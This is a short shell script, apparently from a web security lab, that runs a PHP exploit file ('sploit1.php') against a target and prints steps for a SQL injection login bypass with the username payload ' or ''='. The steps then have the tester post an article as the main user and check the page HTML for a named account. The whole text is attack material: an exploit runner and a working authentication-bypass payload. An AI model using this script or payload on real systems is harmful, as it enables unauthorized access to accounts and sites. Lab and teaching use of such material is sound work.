#! /bin/sh
php sploit1.php $1
echo "\n SQL Injection Attack: \n"
echo "1.) Authenticate with username ' or ''='\n"
echo "2.) Once authenticated as main user, post an image article, which is only an allowed action for the main user\n"
echo "3.) Check above the HTML of the main page, two things: first, username: uhengartner. Second, picture posted as the last article in page\n"
